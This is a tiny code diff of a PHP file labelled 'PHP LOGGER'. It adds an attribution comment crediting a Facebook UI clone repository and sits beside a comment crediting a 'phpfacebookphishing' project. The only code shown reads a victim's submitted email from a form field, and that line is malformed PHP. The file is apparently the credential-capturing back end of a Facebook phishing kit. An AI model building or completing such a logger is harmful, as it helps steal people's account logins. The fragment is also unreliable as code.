@@ -1,6 +1,7 @@
 <?php 
 
     # PHP LOGGER by V0id
+    # Script by https://github.com/pranavks/fb-ui-clone
     # Script by https://github.com/GustavoOliveiraRosa/phpfacebookphishing
 
     $email = POST['inputEmail'];
